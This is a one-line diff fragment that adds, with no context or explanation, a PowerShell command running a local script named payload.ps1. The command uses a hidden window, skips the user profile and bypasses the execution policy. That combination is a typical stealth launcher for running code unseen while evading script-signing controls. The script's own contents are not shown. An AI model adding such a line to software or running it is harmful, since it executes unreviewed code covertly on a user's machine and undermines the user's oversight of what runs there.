@@ -1,0 +1,1 @@
+PowerShell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ./payload.ps1
